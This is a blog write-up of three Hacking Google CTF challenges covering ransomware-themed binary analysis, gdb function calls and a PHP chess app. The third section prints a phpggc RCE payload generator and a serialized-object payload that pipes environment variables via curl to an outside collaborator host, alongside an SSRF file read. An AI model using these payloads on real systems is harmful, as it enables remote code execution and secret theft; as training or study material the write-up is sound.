---
description: "My writeup for EP001 of the Hacking Google CTF : Threat Analysis Group."
authors:
  - techbrunch
date: 2022-10-18
links:
  - blog/posts/hacking-google-operation-aurora.md
tags:
  - CTF
  - Web
  - Reversing
categories:
  - WriteUp
---

# Hacking Google EP001 - Threat Analysis Group

My writeup for EP001 of the Hacking Google CTF : Threat Analysis Group.

<!-- more -->

## Challenge 01 - Wannacry

> Your files have been compromised, get them back.

> Hint: Find a way to make sense of it.

We are provided with a zip archive containing two files:

```
❯ tree
.
├── flag
└── wannacry

0 directories, 2 files
```

The flag appears to be encrypted and the binary is a Go program:

```
❯ file flag
flag: OpenPGP Secret Key
❯ file wannacry
wannacry: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, Go BuildID=IGPSbKhPf45BQqlR84-9/XWC3eVS4fozNp9uK4nDp/_Styn3U-Z8S6ExnY6QOR/RTzNS5QnFmUHeSBeyHIu, with debug_info, not stripped
```

!!!info
		The WannaCry ransomware attack was a worldwide cyberattack in May 2017 by the WannaCry ransomware cryptoworm, which targeted computers running the Microsoft Windows operating system by encrypting data and demanding ransom payments in the Bitcoin cryptocurrency. It propagated through EternalBlue, an exploit developed by the United States National Security Agency (NSA) for Windows systems.

Let's run the program using Docker[^docker-for-pentester]:

[^docker-for-pentester]: [Docker for Pentesters](https://blog.ropnop.com/docker-for-pentesters/)

```
❯ cd challenge
❯ dockershellhereamd ubuntu
root@b1d72e84c9d2:/challenge# ./wannacry
Usage of ./wannacry:
  -encrypted_file string
    	File name to decrypt.
  -key_file string
    	File name of the private key.
```

Using strings I managed to find an interesting domain:

```
❯ strings wannacry|grep http
m=] = ] n=allgallpasn1avx2basebmi1bmi2boolcallcas1cas2cas3cas4cas5cas6chandeadermsfailfileftpsfunchourhttpicmpidleigmpint8itabkindlinkopenpop3readroots + sbrksmtpsse3stattrueuint  -%s ...
 MB,  and  cnt= got  got= max= ms,  ptr  tab= top=, fp:1562578125<nil>AdlamAprilBamumBatakBuhidDograErrorGreekKhmerLatinLimbuLocalMarchNushuOghamOriyaOsageP-224P-256P-384P-521RunicSHA-1STermTakriTamilTypeA] = (arrayclosedeferfalsefaultfilesfloatgcinggscanhchanhttpsimap2imap3imapsinit int16int32int64mheapmonthpanicpop3sscav schedsleepslicesse41sse42ssse3sudogsweeptracetrap:uint8valuewrite B ->  Value addr= alloc base  code= ctxt: curg= free  goid  jobs= list= m->p= max=  min=  next= p->m= prev= span=% util(...)
https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/
```

The [website](https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/) contains a list of pem files:

```html
<pre>
<a href="01087458-4d66-4677-af0d-da2024cc2111.pem">01087458-4d66-4677-af0d-da2024cc2111.pem</a>
<a href="02bdbf0d-48c6-4fb5-b5d2-71be3f4f071f.pem">02bdbf0d-48c6-4fb5-b5d2-71be3f4f071f.pem</a>
<a href="034fac8e-d00d-4386-b5fa-69aa9970adb5.pem">034fac8e-d00d-4386-b5fa-69aa9970adb5.pem</a>
<a href="03eaf52e-f0f0-4f2b-8a2d-ab4b53c342fd.pem">03eaf52e-f0f0-4f2b-8a2d-ab4b53c342fd.pem</a>
...
```

!!!info
		.pem - Defined in RFC 1422 (part of a series from 1421 through 1424) this is a container format that may include just the public certificate (such as with Apache installs, and CA certificate files /etc/ssl/certs), or may include an entire certificate chain including public key, **private** key, and root certificates.

Wannacry being a ransomware we can guess that one of the key was used to encrypt our flag. 

Let's try them all, we will first download them and then write a small bash script to try to decrypt the flag with each key.

I used wget to download all the keys:

```
wget -r -p -k https://wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/
```

A few lines of bash were enough to run the `wannacry` binary with each key, I stored the output in a text file.

```bash
for file in keys/wannacry-keys-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com/*.pem
do
  ./wannacry -encrypted_file flag -key_file "$file" >> results.out
done
```

Grepping for `http` reveals the flag in the output:

```
cat results.out |grep -ai http
btNL9X
      ]aa5BܞCUWԁ*,bT@x7@ fe.]S9ZSy.+a[01;31mhttps://h4ck1ng.google/solve/CrY_n0_m0r3
```

## Challenge 02 - Wannacry Killswitch

> Can you find a way to stop the hackers that encrypted your data?

> Hint: Find a way to switch it off.

This time the only thing we got is a binary that does not output anything when ran.

Let's look for interesting strings:

```
❯ strings wannacry|grep http
https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//
```

Visiting the website returns the following error:

> Our princess is in another castle.

Before using the big tools we can get an idea about what is this program doing using [dogbolt.org](https://dogbolt.org/?id=afbab3cc-2f3c-4e9f-a70d-f9db3760b4e8).

!!!info
        dogbolt is a decompiler Explorer. It is an interactive online decompiler which shows equivalent C-like output of decompiled programs from many popular decompilers.

We can see that the main function doesn't do much and that the intersting functions are `print`, `correct_code` and `totp`.

Let's fire gdb to call the print function manually. We'll first need to find it's address since the name of the function conflicts with the print command.

``` hl_lines="26"
(gdb) info functions
...
Non-debugging symbols:
0x0000555555583000  _init
0x0000555555583030  free@plt
0x0000555555583040  write@plt
0x0000555555583050  strlen@plt
0x0000555555583060  memset@plt
0x0000555555583070  memcpy@plt
0x0000555555583080  time@plt
0x0000555555583090  malloc@plt
0x00005555555830a0  __cxa_finalize@plt
0x00005555555830b0  _start
0x00005555555830e0  deregister_tm_clones
0x0000555555583110  register_tm_clones
0x0000555555583150  __do_global_dtors_aux
0x0000555555583190  frame_dummy
0x0000555555583199  sha1_rotate
0x00005555555831b4  sha1_preprocess
0x000055555558329c  sha1_hash
0x00005555555835ca  count_ones
0x00005555555835f7  extract31
0x00005555555836c4  time_now
0x0000555555583747  totp
0x000055555558378e  correct_code
0x0000555555583817  print
0x0000555555583876  main
```

We can use start to run the program and automatically break on `main ()`:

```
(gdb) start
Temporary breakpoint 1 at 0x2f87a
Starting program: /home/alois_thevenot/wannacry

Temporary breakpoint 1, 0x000055555558387a in main ()
```

We can now manually call the `print` function which will display the URL used to retrieve the flag:

```
(gdb) p (void) 0x0000555555583817 ()
https://wannacry-killswitch-dot-gweb-h4ck1ng-g00gl3.uc.r.appspot.com//ocelot$1 = void
```

Flag: https://h4ck1ng.google/solve/who_turned_off_the_lights

!!!info
    I wasn't able to debug the binary inside Docker since apparantly QEMU's user-mode emulation does not support the ptrace system call.

## Challenge 03 - Hacker Chess 2

[Hacker Chess is back](/blog/hacking-google-ep000-operation-aurora/#challenge-01-hacker-chess), sadly the SQL injection is not present anymore so we will need to find another way to beat the AI.

The first thing I thought about was to check the potential insecure deserialization vulnerability[^insecure-deserialization] since when you move a piece on the board a GET request is sent along with a base64 encoded serialized string: `GET /?move_end=YToyOntpOjA7czoyOiJmMiI7aToxO3M6MjoiZjQiO30=`, decoded it looks like this: `a:2:{i:0;s:2:"f2";i:1;s:2:"f4";}` which translates to move the piece in `F2` to `F4`.

[^insecure-deserialization]: [Insecure deserialization](https://portswigger.net/web-security/deserialization)

To exploit a deserialization vulnerability you need a vulnerable class implementing magic methods such as `__toString`, `__destruct` or `__wakeup`. Since we don't have the source code and no idea about what vulnerable classes could be loaded the only thing we can try so far is to send known payload exploiting common vulnerable classes.

I used this script by [honoki](https://twitter.com/honoki) to generate all the RCE payload for every gadget chain in [phpggc](https://github.com/ambionics/phpggc) but this did not work:

```bash
#!/bin/bash

# phpggc wrapper that automatically generates payloads for RCE gadgets

function="system"
command="wget http://your.burpcollaborator.net/?"
# modify the options below depending on your use case
options="-a -b -u -f"

# generate gadget chains
./phpggc -l | grep RCE | cut -d' ' -f1 | xargs -L 1 ./phpggc -i | grep 'phpggc ' --line-buffered |
while read line;  do
   gadget=$(echo $line | cut -d' ' -f2) &&
   if echo $line | grep -q "<function> <parameter>"; then
      ./phpggc $options $gadget "$function" "$command?$(date +%s)"
   elif echo $line | grep -q "<code>"; then
      ./phpggc $options $gadget "$function('$command?$(date +%s)');"
   elif echo $line | grep -q "<command>"; then
      ./phpggc $options $gadget "$command?$(date +%s)"
   else
      ./phpggc $options $gadget
   fi;
done
```

I then found out that there was a Server-side request forgery (SSRF)[^ssrf] in the feature used to start the game. This is a POST request with a parameter `filename` set to `baseboard.fen`. We can replace the value by a URL and the game will try to load it.

[^ssrf]: [Server-side request forgery (SSRF)](https://portswigger.net/web-security/ssrf)

My first attempt was to load a [custom FEN](https://gist.githubusercontent.com/Techbrunch/b0a72c4c1933a85b7c74726b0dc372ae/raw/d19b62c0036d68965218f9dc4e61ef08e104ff3d/baseboard.fen) with mate in one move for white. To do this I used a [Chess FEN Viewer](https://www.dailychess.com/chess/chess-fen-viewer.php).

!!!info
    Forsyth–Edwards Notation (FEN) is a standard notation for describing a particular board position of a chess game. The purpose of FEN is to provide all the necessary information to restart a game from a particular position.

It worked but this time winning wasn't enough anymore:

> Winning against me won't help anymore. You need to get the flag from my envs.

Turns out we can use the same vulnerability to read the source code of the application, if we set the `filename` value to `index.php`, the content of `index.php` will be returned as part of the response. 

We can see that the class `Stockfish` implements the `__wakeup` that we could use to execute arbitrary command. Now we have everything we need to exploit the deserialization vulnerability.

```php
<?php
class Stockfish
{
    public $cwd = "./";
    public $binary = "/usr/games/stockfish";
    public $other_options = array('bypass_shell' => 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
                1 => array("pipe","w"),
    );
    private $process;
    private $pipes;
    private $thinking_time;

    public function __construct()
    {
        $other_options = array('bypass_shell' => 'true');
        //echo "Stockfish options" . $_SESSION['thinking_time'];
        if (isset($_SESSION['thinking_time']) && is_numeric($_SESSION['thinking_time'])) {
            $this->thinking_time = $_SESSION['thinking_time'];
        } else {
            $this->thinking_time = 10;
        }
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
    }
    public function passUci()
    {
        if (is_resource($this->process)) {
            fwrite($this->pipes[0], "uci\n");
            fwrite($this->pipes[0], "ucinewgame\n");
            fwrite($this->pipes[0], "isready\n");
        }
    }

    public function passPosition(string $fen)
    {
        fwrite($this->pipes[0], "position fen $fen\n");
        fwrite($this->pipes[0], "go movetime $this->thinking_time\n");
    }

    public function readOutput()
    {
        while (true) {
            usleep(100);
            $s = fgets($this->pipes[1], 4096);
            $str .= $s;
            if (strpos(' '.$s, 'bestmove')) {
                break;
            }
        }
        return $s;
    }

    public function __toString()
    {
        return fgets($this->pipes[1], 4096);
    }

    public function __wakeup()
    {
        $this->process = proc_open($this->binary, $this->descriptorspec, $this->pipes, $this->cwd, null, $this->other_options) ;
        echo '<!--'.'wakeupcalled'.fgets($this->pipes[1], 4096).'-->';
    }
}
```

This small PHP code will generate our base64 encoded payload:

```php
<?php

class Stockfish
{
    public $cwd = "./";
    public $binary = 'env|base64| curl -X POST --data-binary @- a8jxxhwp8su07krjp21elz93musrgg.oastify.com';
    public $other_options = array('bypass_shell' => 'true');
    public $descriptorspec = array(
        0 => array("pipe","r"),
                1 => array("pipe","w"),
    );
}

$a = new Stockfish();
$b = serialize($a);

echo base64_encode($b);
```

Once we send the request we will receive the content of environment variable via our Burp collaborator instance.

Flag: https://h4ck1ng.google/solve/rc3_l1k3_4_tru3_ch355_m45t3r